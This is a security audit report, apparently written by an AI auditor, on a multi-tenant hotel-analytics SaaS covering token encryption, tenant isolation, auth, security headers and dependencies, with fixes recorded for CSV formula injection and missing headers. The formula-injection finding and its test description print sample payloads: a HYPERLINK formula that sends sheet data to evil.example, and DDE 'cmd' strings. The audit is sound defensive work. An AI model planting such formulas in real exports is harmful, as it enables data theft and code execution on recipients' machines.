# HotelTrack — Security Audit Report

**Date:** 2026-06-10
**Auditor:** Claude (automated code audit)
**Scope:** Full codebase — multi-tenant SaaS (Next.js 16 App Router, Prisma 7/PostgreSQL, Clerk auth, Razorpay billing, Meta/Instagram/GA4 token handling)
**Commit:** `444310c`
**Type:** Read-only audit. No code was modified. Token values are not reproduced anywhere in this report.

---

## Executive Summary

**Overall security posture: STRONG.**

HotelTrack is, unusually, a codebase where security was clearly designed in from the start rather than bolted on. Token encryption (AES-256-GCM with key versioning + rotation), a layered secret-handling model (`SecretToken` redaction class, a Prisma extension that strips ciphertext from *every* query result, a global `console` redaction net, out-of-band token access with audit logging and burst alerting), and a centralized multi-tenant scoping layer (`agencyScoped`/`agencyScopedFor` + prepared Postgres RLS) are all present and consistently applied. Two independent sweeps of every API route, server action, and page data-load found **no cross-tenant data leak and no missing-auth route**. All HMAC/signature/password comparisons are constant-time; OAuth flows use signed, expiring, tenant-bound state tokens.

**No Critical issues were found.** The highest-priority items are: (1) a **CSV/Excel formula-injection** vector reachable from the unauthenticated tracking endpoint that lands in customer-downloaded spreadsheets *(✅ fixed 2026-06-10 — see H-1)*; (2) the **defense-in-depth database layer (RLS + non-owner DB role) is built but not yet activated**, so tenant isolation currently rests entirely on the (consistently-applied) application layer; (3) **no HTTP security headers** (CSP/X-Frame-Options/HSTS); *(✅ fixed 2026-06-10 — see M-1)*; and (4) a **High-severity `xlsx` dependency** vulnerability (mitigated in practice by write-only usage). None of these block onboarding outright, but #1–#3 should be fixed first.

---

## Priority Matrix

### Critical (fix THIS WEEK — before any agency onboards)
- *None.*

### High (fix this month)
- **H-1** ✅ **RESOLVED (2026-06-10)** — CSV / Excel formula injection via unauthenticated tracking data → customer spreadsheets — `lib/csv.ts`, all export routes.
- **H-2** Defense-in-depth not active: Postgres RLS + non-owner DB role prepared but app still connects as table owner; `TOKEN_SECRET_ACCESS=direct`.
- **H-3** `xlsx@0.18.5` — Prototype Pollution (CVE-2023-30533) + ReDoS, no registry fix.

### Medium (fix this quarter)
- **M-1** ✅ **RESOLVED (2026-06-10)** — No HTTP security headers (CSP, X-Frame-Options/`frame-ancestors`, HSTS, X-Content-Type-Options) — clickjacking + missing hardening.
- **M-2** RLS policy set & security-definer function omit tables added after the RLS migration; if the non-owner role is enabled as-is, those tenant tables would be **unprotected**.
- **M-3** In-memory rate limiter is per-serverless-instance — the public ingest cap is not global.
- **M-4** Tracking snippet sets cookies with no consent mechanism (DPDP/GDPR-style compliance gap).

### Low / Info (track and improve)
- **L-1** Hardcoded dev-secret fallback for the share HMAC / IP-hash salt.
- **L-2** 3 of 4 `/admin` pages rely solely on the layout guard (no in-page `super_admin` re-check).
- **L-3** Verbose OAuth-callback logging discloses env/config/topology (tokens themselves are masked).
- **L-4** Cron bearer-token checks use `!==` rather than a constant-time compare.
- **L-5** `ipSalt()` reuses `ENCRYPTION_KEY` as the IP-hash salt (key reuse across purposes).
- **L-6** Data-subject deletion / export ("right to be forgotten") not verified to exist as a self-serve flow.

---

# Section 1 — Token Encryption at Rest

**Verdict: STRONG.** Encryption is correctly implemented and layered.

| Token type | Storage encryption | Algorithm | Logging exposure | Client-side exposure |
| --- | --- | --- | --- | --- |
| Meta (Ads) | **YES** | AES-256-GCM (versioned) | None found | None found |
| Instagram (IGAA) | **YES** | AES-256-GCM (versioned) | None found | None found |
| GA4 (access + refresh) | **YES** | AES-256-GCM (versioned, both columns) | None found | None found |
| GA service-account creds | **YES** | AES-256-GCM (versioned) | None found | None found |

**Evidence / how it's done well:**
- `lib/encryption.ts` — AES-256-GCM, 12-byte random IV per call, 16-byte auth tag, versioned ciphertext format `v<n>:<iv>:<tag>:<ct>` with per-version keys in `ENCRYPTION_KEY_V<n>`, legacy fallback, and an `assertEncryptionKeysValid()` startup guard (wired in `instrumentation.ts`) that refuses to boot on a missing/short/non-hex key.
- **Key storage:** environment variables only (`ENCRYPTION_KEY_V1` / legacy `ENCRYPTION_KEY`), documented to live in the host secret manager and never committed (`.env.example:102-121`).
- **Key rotation:** supported (`ENCRYPTION_KEY_VERSION`, `npm run rotate:keys`, `scripts/rotate-encryption-keys.ts`).
- **`SecretToken` class** redacts on every serialization path (`toString`/`toJSON`/`util.inspect`); plaintext is only obtainable via an explicit `.reveal()`.
- **`lib/prisma.ts`** `$extends` strips `encryptedToken`/`encryptedCredentials`/`accessToken`/`refreshToken` from **every** model query result — a ciphertext cannot accidentally ride into an API response or a client prop.
- **`lib/token-access.ts`** is the single sanctioned decryption path; reads ciphertext out-of-band and records an audit log entry.
- **`lib/redact.ts` + `instrumentation.ts`** wrap `console.log/warn/error` to scrub `EAA…`/`IGAA…` token patterns globally.

**Logging exposure risk:** Low. OAuth callbacks log a lot (`[IG-OAUTH]`, `[GA4-OAUTH]`) but mask secrets to `len=… head=4chars`. The global redaction net is a second line of defense. (See L-3 for the non-secret config disclosure.)

**Client-side exposure risk:** None found. No token is returned in any API response or passed to a client component.

---

# Section 2 — Multi-Tenant Isolation (CRITICAL)

## Verdict: **SECURE** (application layer) — with one important caveat (H-2).

A full sweep of every direct `prisma.<model>` access in `app/` and `lib/` confirmed that every read/write of a tenant table is scoped by `agencyId` — via `agencyScoped`/`agencyScopedFor`, an explicit `where: { agencyId }`, a token/siteId/shareToken-resolved agencyId, or a deliberate super-admin path. **No IDOR or cross-tenant leak was found.**

Representative evidence:
- Centralized scoping helpers in `lib/tenant.ts` (`agencyScoped`, `requireAgencyId`, `requireSuperAdmin`) and `lib/tenant-scope.ts`.
- Routes that accept a user-supplied `hotelId`/`hotel` resolve it **through** `agencyScoped(...).findFirst` first, so another tenant's id returns 404/empty rather than leaking (`app/api/reports/excel/route.ts:31-35`, `app/api/reports/csv/route.ts:23-27`, `app/api/meta/backfill/route.ts:33-39`, `app/api/content/export/route.ts`).
- OAuth callbacks re-verify `where: { id: hotelClientId, agencyId }` from the **signed** state (`app/api/auth/instagram/callback/route.ts:89-92`, `app/api/auth/ga4/callback/route.ts:68-71`).
- Public `/h/<shareToken>` and `/share/<uuid>` derive `agencyId`+`hotelClientId` **from the token record** and pass that explicit pair into the data layer; they never trust client input for scope.
- Public `/api/track/event` stamps `agencyId`/`hotelClientId` from the hotel resolved by `siteId` — the client body cannot set the tenant.

**Could a user forge their agencyId via JWT/session?** No. The role + agency come from the Clerk session (server-verified) and the `AgencyMember.clerkId → agencyId` DB mapping, never from a client-supplied value. `agencyId` checks are server-side throughout.

### Caveat H-2 — RLS / DB-role hardening is built but inert
`prisma/migrations/20260530100000_enable_rls/migration.sql` enables RLS **`WITHOUT FORCE`**, and the app still connects as the **table owner** (owners bypass non-forced RLS). The migration header says so explicitly: *"this migration changes NOTHING for the current connection."* Likewise `TOKEN_SECRET_ACCESS=direct` (`.env.example:133`) means the security-definer token-read function is unused. **Net effect: isolation currently has only one layer (the application layer).** That layer is applied consistently — but there is no database backstop yet. (Fix: provision the non-owner `hoteltrack_app` role for the runtime connection and set `TOKEN_SECRET_ACCESS=definer`; see M-2 first.)

**RLS status:** Enabled in schema, **not enforcing** at runtime → defense-in-depth gap (High).

---

# Section 3 — Authentication & Session Security

**Verdict: STRONG.**

1. **Route protection** — `proxy.ts` (Next 16's renamed middleware) runs `clerkMiddleware`, defines an explicit public-route allowlist, and **redirects every other route to sign-in**. Roles are enforced by URL prefix: `/agency*` → `agency_admin`, `/admin*` → `super_admin`, `/hotel*` → `hotel_client`. The matcher covers all API routes.
2. **Session tokens** — handled entirely by Clerk (HttpOnly, Secure, SameSite cookies managed by the provider). No app code stores session tokens in `localStorage`. No custom JWT/"remember-me" tokens with hand-rolled entropy.
3. **Authorization beyond authN** — role checks are server-side in `proxy.ts` and re-derived server-side in `lib/auth.ts` (`getPlatformRole`) / `lib/tenant.ts` (`requireSuperAdmin`, `requireAgencyId`). Super-admin server actions re-check the role in-handler (`adminSyncNow` also requires `ADMIN_PASSWORD`, constant-time compared).
4. **Logout** — delegated to Clerk (server-side session revocation).
5. **Account takeover surface** — password reset / email change / MFA are all handled by Clerk's hosted flows; the app does not implement its own credential handling, which removes a large class of risk.

**Findings:** L-2 (3 of 4 `/admin` pages depend only on the layout guard for the `super_admin` check — add an in-page re-check for defense in depth, matching `app/admin/audit/page.tsx`).

---

# Section 4 — API Endpoint Protection

**Verdict: STRONG.** Every route enforces the appropriate mechanism. Summary of the audit of all 23 routes:

| Route | Auth mechanism | Ownership / scope | Notes |
| --- | --- | --- | --- |
| `track/event`, `track/config` | Public (by design) | siteId-scoped | Rate-limited; input clamped; no PII; CORS `*` is correct (no creds) |
| `webhooks/razorpay` | HMAC-SHA256 (constant-time) | resolved from signed payload | Fails closed if secret unset |
| `auth/instagram/*`, `auth/ga4/*` | Clerk (start) / signed state (callback) | ownership re-verified | Tenant-bound, 10-min expiry |
| `agency/export`, `hotels/export`, `content/export`, `reports/csv`, `reports/excel` | Clerk (`getCurrentMember`) | `agencyScoped` + hotel ownership | 401 if unauth, 404 on foreign id |
| `meta/backfill`, `agency/slack/test` | Clerk | `where:{id,agencyId}` / own agency | Slack URL host-validated |
| `meta/sync`, `instagram/sync`, `instagram/refresh-tokens`, `ga/sync`, `ga4/sync`, `budget/check`, `billing/renewal-reminders` | `CRON_SECRET` bearer | per-row agencyId | **Fail closed** when secret unset |
| `alerts/run` | `CRON_SECRET` bearer | platform-level | `?type` whitelisted |
| `guide` | Public (by design) | agency-attribution ownership-checked | Serves static PDF |

**`/api/track/event` DoS posture:** rate-limited 60/min per `siteId+IP` (`RATE_LIMIT_PER_MIN`), unknown siteId → 403, body parsed defensively (512-char field cap, journey capped at 20, value validated ≥0), never throws. Good — but the limiter is per-instance (see M-3).

**Findings:** No missing-auth or IDOR routes. See H-1 (export data content), M-3 (rate-limit scope), L-3/L-4.

---

# Section 5 — Input Validation & Injection

**Verdict: STRONG, with one exception (H-1).**

1. **SQL Injection — none.** All raw SQL (`lib/token-access.ts`, `lib/rls.ts`) uses constant, allow-listed table/column identifiers and parameterizes user values (`$1` / tagged templates). `$queryRawUnsafe` appears only in `lib/token-access.ts` (constant identifiers) and in `scripts/`+`tests/` (developer-only).
2. **XSS — none found.** No `dangerouslySetInnerHTML` anywhere in `app/`. React auto-escaping applies; the tracking snippet is built from a static source (`scripts/snippet.src.js`) and served as a static asset.
3. **NoSQL / object injection — N/A.** Postgres + Prisma; no user input used as object keys or `$`-operators.
4. **Command injection — none.** No `child_process`, `eval`, or `new Function` in app code.
5. **Header injection — none found.** No user-supplied data is reflected into response headers (filenames in `Content-Disposition` are derived from server-side slugs/ranges).

### H-1 — CSV / Excel Formula Injection (CSV Injection)  ✅ RESOLVED 2026-06-10
- **Category:** Input · **Severity:** High · **Status:** **FIXED**
- **Files:** `lib/csv.ts:7-14` (`escapeCell`); all export routes — `app/api/reports/excel/route.ts`, `app/api/reports/csv/route.ts`, `app/api/agency/export/route.ts`, `app/api/hotels/export/route.ts`, `app/api/content/export/route.ts`.
- **Description:** `escapeCell` performs RFC-4180 quoting but does **not** neutralize spreadsheet formula triggers (`=`, `+`, `-`, `@`, and leading tab/CR). The `xlsx` `json_to_sheet`/`aoa_to_sheet` paths likewise write strings verbatim, so a cell beginning with `=` is interpreted as a formula by Excel/LibreOffice/Google Sheets. The injected data — `utmSource/Medium/Campaign/Content`, `pageUrl`, `visitorId` — originates from the **unauthenticated** `/api/track/event` endpoint and from UTM links, then flows into the "Event Log"/"Daily by Source" sheets and CSV exports the agency downloads.
- **Attack scenario:** A hotel's `siteId` is embedded in the public tracking snippet on the hotel's website, so it is not secret. An attacker POSTs a crafted event, e.g. `pageUrl` or `utmCampaign` = `=HYPERLINK("https://evil.example/?l="&CONCATENATE(A1:Z1),"View report")` or a DDE-style `=cmd|'/c calc'!A1`. When the agency exports and opens the report, the formula executes/prompts — enabling data exfiltration from the sheet, credential-phishing links rendered as innocuous text, or (with macros/DDE enabled) code execution on the agency's machine. The victim is the paying customer opening a "trusted" report.
- **Recommended fix:** Prefix any cell whose first character is one of `= + - @ \t \r` with a single quote (`'`) or a leading space before serialization, in **both** `escapeCell` (for CSV) and a shared sanitizer applied to all values handed to `XLSX.utils.*_sheet`. Keep the existing RFC-4180 quoting. (Standard OWASP CSV-injection mitigation.)

> #### ✅ Resolution — 2026-06-10
> **Approach:** Added a shared neutralizer that prefixes a single quote to any **string** cell beginning with a formula trigger (`= + - @` / TAB / CR), leaving numbers, dates, and booleans untyped-unchanged so legitimate values (e.g. negative numbers) aren't corrupted. Applied to both the CSV serializer and every XLSX write site; RFC-4180 quoting is preserved. Export column structure and sheet names are unchanged.
>
> **Files modified:**
> - `lib/xlsx.ts` *(new)* — `neutralizeFormula`, `sanitizeForSpreadsheet`, `sanitizeRows` (for `json_to_sheet`), `sanitizeAoa` (for `aoa_to_sheet`).
> - `lib/csv.ts` — `escapeCell` now routes string cells through `neutralizeFormula` before quoting; numbers/dates untouched.
> - `app/api/reports/excel/route.ts` — wrapped all 4 sheets (`sanitizeRows` ×3, `sanitizeAoa` ×1).
> - `app/api/agency/export/route.ts` — wrapped both sheets (`sanitizeAoa` + `sanitizeRows`).
> - `app/api/hotels/export/route.ts` — wrapped the Hotels sheet (`sanitizeRows`).
> - `app/api/content/export/route.ts` — wrapped the Content Library sheet (`sanitizeRows`).
> - `app/api/track/event/route.ts` — *(defense in depth)* the `str()` ingest coercer now strips ASCII control chars (incl. TAB/CR/LF) and caps length at 512.
> - `tests/csv-injection.test.ts` *(new)* — regression test.
>
> **Test results:** `npx vitest run tests/csv-injection.test.ts` → **9/9 passing**. The XLSX round-trip test writes the exact attacker payloads (`=HYPERLINK(...)`, `=CMD|'/c calc'!A1`, `+HYPERLINK(...)`, `-2+5+cmd|'/c calc'!A0`, `@SUM(A1:A10)`, plus leading TAB/CR), serializes through the real `xlsx` library, reads the workbook back, and asserts each cell is a **string** type (`t==="s"`) with **no formula** (`.f === undefined`) and a value defused with a leading `'`. Numeric cells are asserted to remain numeric (`t==="n"`, e.g. `-1250.5`). CSV assertions confirm no serialized record begins with a bare formula trigger. `npx tsc --noEmit` → **0 errors**.

---

# Section 6 — CORS, CSRF, and Cross-Origin

1. **CORS** — `Access-Control-Allow-Origin: *` is set only on the public tracking endpoints (`/api/track/event`, `/api/track/config`). This is correct: they accept anonymous cross-origin POST/GET from hotel sites, carry **no credentials**, and are scoped by the public `siteId`. No other route sets permissive CORS. No `Access-Control-Allow-Credentials` is used. **OK.**
2. **CSRF** — State-changing operations are Next.js **Server Actions** (built-in Origin/same-site CSRF protection in Next 14+) and Clerk-authenticated routes (SameSite session cookies). Webhooks/crons are not session-authenticated (they use HMAC / bearer secret), so they are not CSRF-relevant. No custom cookie-authenticated state-changing form was found. **OK.**
3. **CSP** — ✅ **Set (M-1 resolved 2026-06-10).** A tailored `Content-Security-Policy` is now emitted on every response via `next.config.ts` → `headers()`. `'unsafe-inline'` is still allowed for scripts (Next.js injects inline bootstrap scripts; nonce-based CSP is a future hardening step).
4. **Clickjacking** — ✅ **Protected (M-1 resolved 2026-06-10).** `X-Frame-Options: DENY` and CSP `frame-ancestors 'none'` are now set on all routes.

### M-1 — No HTTP security headers  ✅ RESOLVED 2026-06-10
- **Category:** CORS/Headers · **Severity:** Medium · **Status:** **FIXED**
- **File:** `next.config.ts` (was empty).
- **Description:** Missing `Content-Security-Policy`, `X-Frame-Options: DENY` (or CSP `frame-ancestors 'none'`), `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, and `Referrer-Policy`.
- **Attack scenario:** Clickjacking of authenticated actions via an iframe overlay; absent CSP, any future reflected/stored HTML sink becomes immediately exploitable and there's no script all-listing.
- **Recommended fix:** Add an `async headers()` block in `next.config.ts` applying the headers above to all routes (with a `frame-ancestors`/`X-Frame-Options` exception only where embedding is intended — note the public `/h` and `/share` pages may be intentionally framed; scope accordingly). Verify Clerk's required script/connect origins when authoring the CSP.

> #### ✅ Resolution — 2026-06-10
> **Approach:** Added an `async headers()` block to `next.config.ts` emitting six security headers on every route (`source: "/:path*"`): `Strict-Transport-Security` (2y, includeSubDomains, preload), `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy: camera=(), microphone=(), geolocation=()`, and a tailored `Content-Security-Policy`. A second rule sets `Cache-Control: public, max-age=300` on `/t.js`.
>
> **CSP tailored to the actual stack** (not the generic template):
> - `script-src`: `'self' 'unsafe-inline'` + Clerk (`*.clerk.accounts.dev`, `*.clerk.com`) + Cloudflare Turnstile (`challenges.cloudflare.com`) + **Razorpay Checkout** (`checkout.razorpay.com`).
> - `connect-src`: `'self'` + Clerk + **Razorpay** (`*.razorpay.com`, `lumberjack.razorpay.com`) + the Meta/Instagram/Google API hosts.
> - `frame-src`: `'self'` + Clerk + Turnstile + **Razorpay** (`api.razorpay.com`, `*.razorpay.com`) — required because Razorpay Checkout opens its payment UI in an iframe.
> - `img-src 'self' data: https: blob:`, `font-src 'self' data:`, `worker-src 'self' blob:` (Clerk), `frame-ancestors 'none'`, `base-uri 'self'`, `object-src 'none'`.
> - **Removed** the template's `https://api.openai.com` (HotelTrack does not use OpenAI). next/font (Geist) is self-hosted by Next, so no external font origin is needed.
> - **CORS for `/api/track/*` was intentionally NOT added to `next.config.ts`** — the route handlers already set `Access-Control-Allow-Origin: *` and handle the OPTIONS preflight; a duplicate header makes browsers reject the response. Verified the snippet endpoints still return a single ACAO header.
>
> **Files modified:** `next.config.ts`.
>
> **Verified automatically (dev server, port 3001):**
> - All six headers present on a page response (`GET /`); CSP value confirmed.
> - `GET /t.js` → `Cache-Control: public, max-age=300` + the security headers.
> - `GET /api/track/config` and `OPTIONS /api/track/event` → `Access-Control-Allow-Origin: *` present **exactly once** (snippet CORS intact, not duplicated by the global headers).
> - `GET /sign-in` → HTTP 200; the only external origin in the markup is `*.clerk.accounts.dev`, which the CSP allowlists. App boots with no config error.
>
> **Still requires manual confirmation in a real browser** (needs interactive third-party sessions / real credentials that can't be driven from a CLI): (a) zero CSP violations in the DevTools console across dashboard/charts, billing, and the integrations pages; (b) full Razorpay payment click-through; (c) full Meta/Instagram/GA4 OAuth round-trips. Note: OAuth provider redirects are top-level navigations (not governed by `script-src`/`connect-src`/`frame-src`), and `form-action`/`navigate-to` are intentionally left unset, so the redirects should not be blocked.
>
> **Production note:** when cutting over to a **production Clerk instance**, add that instance's Frontend API host (typically `clerk.<your-domain>`) to `script-src` and `connect-src` — the current allowlist covers Clerk's dev (`*.clerk.accounts.dev`) and CDN (`*.clerk.com`) hosts.

---

# Section 7 — Secrets & Configuration

**Verdict: STRONG.**

1. **`process.env` usage** classified — all `NEXT_PUBLIC_*` vars are non-secret by design: `NEXT_PUBLIC_APP_URL`, Clerk **publishable** key, `NEXT_PUBLIC_RAZORPAY_KEY_ID` (the public key id), `NEXT_PUBLIC_SHARE_BASE_URL`, `NEXT_PUBLIC_TRACKING_MODE`. **No secret is exposed to the client.**
2. **`next.config.ts`** has **no** `env:` block leaking server vars to the bundle. **OK.**
3. **Encryption key** — env-only, hex-validated, startup-asserted, rotation-ready (see Section 1). **OK.**
4. **Secrets in git** — `.env`, `.env.local`, `.env.production` are **not** tracked (only `.env.example`, which contains deliberately fake placeholders — `.env.example:9-11`). A scan of the working tree for `EAA…`/`sk_…`/`rzp_…` patterns matched only the example template and docs. `package-lock.json` is committed; no typosquatted/confusable dependency names observed.
5. **Default credentials** — none hardcoded for production. (See L-1 for the share-secret dev fallback.)

### L-1 — Hardcoded dev-secret fallback for share signing / IP salt
- **Category:** Secrets/Config · **Severity:** Low
- **Files:** `lib/share.ts:47`, `lib/hotel-share.ts:24` — fall back to `"hoteltrack-dev-share-secret"` when both `ENCRYPTION_KEY` and `CRON_SECRET` are unset.
- **Scenario:** In a correctly-configured prod deploy `ENCRYPTION_KEY` always exists, so this is inert there. But a misconfigured deploy would silently make unlock cookies **forgeable** and IP hashes **guessable** with no error.
- **Fix:** Fail closed — assert one of the real secrets is present at startup (alongside `assertEncryptionKeysValid()`), rather than falling back to a constant.

### L-5 — IP-hash salt reuses the encryption key
- `lib/hotel-share.ts:23-24` uses `ENCRYPTION_KEY` as the salt for visitor-IP SHA-256 hashing. Reusing a root secret across purposes is a minor hygiene issue; prefer a dedicated `IP_HASH_SALT`. **Low.**

---

# Section 8 — Dependency Vulnerabilities

`npm audit`: **6 total — 1 High, 5 Moderate, 0 Critical.**

| Package | Severity | Issue | Real-world risk here |
| --- | --- | --- | --- |
| `xlsx@0.18.5` | **High** | Prototype Pollution (CVE-2023-30533) + ReDoS (CVE-2024-22363); **no fixed version on the npm registry** | **Reduced** — used **write-only** (export generation), never to parse untrusted uploads. Prototype-pollution/ReDoS require parsing attacker-controlled workbooks, which this app does not do. Still flagged High. |
| `postcss` (via `next`) | Moderate | XSS via unescaped `</style>` in CSS stringify | Build-time tooling; low runtime exposure |
| `@hono/node-server` (via `@prisma/dev`, `prisma`) | Moderate | serveStatic middleware bypass via repeated slashes | **Dev-only** tooling, not shipped to prod |

### H-3 — `xlsx@0.18.5`
- **Category:** Dependencies · **Severity:** High (audit) / Medium (effective, given write-only usage)
- **Recommended fix:** Migrate to the maintained SheetJS build from their CDN (`https://cdn.sheetjs.com/...`, which carries the fixes) or replace the export layer with `exceljs`. Pin and document. Until then, the write-only usage keeps practical risk low — but resolve before accepting any feature that *reads* user-uploaded spreadsheets.

**Outdated majors:** none more than 2 majors behind that are security-relevant. **Lock file:** `package-lock.json` committed; no dependency-confusion indicators.

---

# Section 9 — Data Privacy & Compliance

**Verdict: NEEDS ATTENTION (compliance, not a code vulnerability).**

1. **PII handling** — Minimal by design. The tracking endpoint stores **no** personal data (UTM + page + device only); the share access log stores a **salted SHA-256 of the IP**, never the raw address (`lib/hotel-share.ts`). Tokens/credentials are encrypted at rest. **Good.**
2. **Cookie consent (M-4)** — The tracking snippet sets first-party cookies/identifiers (`visitorId`, `_ht_journey`) with **no consent mechanism**. For EU visitors (GDPR/ePrivacy) and under India's DPDP Act, analytics cookies generally require notice/consent. This is a compliance gap, not a security hole. **Medium (compliance).**
3. **DPDP / data residency** — No privacy policy or data-residency disclosure was found in-repo; the DB host (Neon) location is not disclosed to end users. Confirm a published privacy policy and processor disclosures exist before onboarding Indian hotel clients.
4. **Data export / deletion (L-6)** — Agencies can export their data (CSV/XLSX/PDF). A self-serve **deletion / right-to-be-forgotten** flow for a hotel's visitor data or an agency's account was **not** confirmed in the audited surface. Verify cascade-delete behavior and add a documented deletion path.

---

# Section 10 — Logging & Monitoring

**Verdict: STRONG on secret-safety; minor over-disclosure.**

1. **Audit logs** — Sensitive token actions (create/decrypt/refresh/rotate/delete/failed-decrypt) are recorded to `TokenAuditLog` with actor, tenant, source, IP, and UA (`lib/token-audit.ts`), reviewable at `/admin/audit`. A **burst of >3 failed decryptions in 10 min triggers a security alert email** (`maybeAlertOnDecryptFailures`). Excellent.
2. **Log content** — Tokens are masked at the call site **and** scrubbed globally by `installConsoleRedaction()` (`lib/redact.ts` + `instrumentation.ts`). Webhook logging is ids-only. No password/token plaintext logging found.
3. **Error handling** — Public endpoints return generic messages (`"Temporarily unavailable"`, `"Invalid body"`); the webhook redacts handler error messages before returning. Stack traces are logged server-side (redacted), not returned to clients.

### L-3 — Verbose OAuth-callback config disclosure
- `app/api/auth/instagram/callback/route.ts:55-67` and `app/api/auth/ga4/callback/route.ts:38-50` log env-var presence, the **DB host**, app ids, redirect URIs, IG usernames, and account ids. Tokens are masked, but this topology/config disclosure is unnecessary in steady state and would aid an attacker who gains log access. **Low** — gate behind a debug flag or reduce once the integrations are stable.

### L-4 — Cron bearer compare not constant-time
- All cron routes compare `authorization !== \`Bearer ${secret}\`` with `!==` rather than `timingSafeEqual`. Negligible for a 256-bit secret over HTTP, but trivial to harden. **Info/Low.**

---

# Recommended Fix Order (Top 5)

| # | Fix | Why first | Est. effort |
| --- | --- | --- | --- |
| 1 | ✅ **DONE (2026-06-10)** — H-1 CSV/Excel formula injection — neutralization added in `lib/csv.ts` + shared `lib/xlsx.ts` sanitizer for all `XLSX.utils.*_sheet` inputs; 9/9 regression tests pass | Only concretely exploitable issue; unauthenticated source → paying customer's machine | ~~2–4 hrs~~ done |
| 2 | ✅ **DONE (2026-06-10)** — M-1 Security headers — `headers()` added in `next.config.ts` (CSP tailored to Clerk + Razorpay, frame-ancestors `none`/X-Frame-Options DENY, HSTS, nosniff, Referrer-Policy, Permissions-Policy); header emission verified via dev server | Cheap, broad hardening; closes clickjacking + caps future XSS | ~~2–4 hrs~~ done (browser console + payment/OAuth click-through still to confirm) |
| 3 | **H-2/M-2 Activate the DB defense layer** — provision the non-owner `hoteltrack_app` runtime role, **add RLS policies + grants for the tables created after the RLS migration**, then set `TOKEN_SECRET_ACCESS=definer` (and add GA4/Instagram columns to the definer function) | Turns isolation from one layer into two; M-2 must be done **with** H-2 or the new tables would be unprotected under the new role | 1–2 days incl. `test:rls`/`test:isolation` |
| 4 | **H-3 `xlsx`** — move to the patched SheetJS CDN build or `exceljs` | Removes the only High dependency finding; prerequisite before any spreadsheet *upload* feature | 0.5–1 day |
| 5 | **M-4 + L-6 Privacy** — add a cookie-consent gate to the snippet, publish a privacy policy / data-residency notice, and add a documented data-deletion flow | Compliance gate for EU/India onboarding | 1–3 days (legal + code) |

**Then track:** L-1 (fail-closed share secret), L-2 (admin in-page role re-checks), L-3 (trim OAuth logging), L-4 (constant-time cron compare), L-5 (dedicated IP salt), M-3 (Redis/Upstash global rate limit).

---

## What the codebase gets right (for context)

- AES-256-GCM with versioned keys + rotation, startup key assertion, `SecretToken` redaction, Prisma ciphertext-stripping extension, out-of-band audited token access, global console redaction, failed-decrypt burst alerting.
- Centralized, consistently-applied multi-tenant scoping; prepared (if not-yet-active) RLS + non-owner-role + security-definer architecture.
- Signed, expiring, tenant-bound OAuth `state`; HMAC webhook verification; constant-time signature/password/cookie comparisons; scrypt password hashing; 256-bit CSPRNG share tokens; salted IP hashing.
- Rate-limited, PII-free, defensively-parsed public ingest; tenant-stamped from server-resolved siteId.
- Secrets kept out of git; no client-side secret exposure; no SQL/command/XSS injection sinks in app code.

*End of report.*
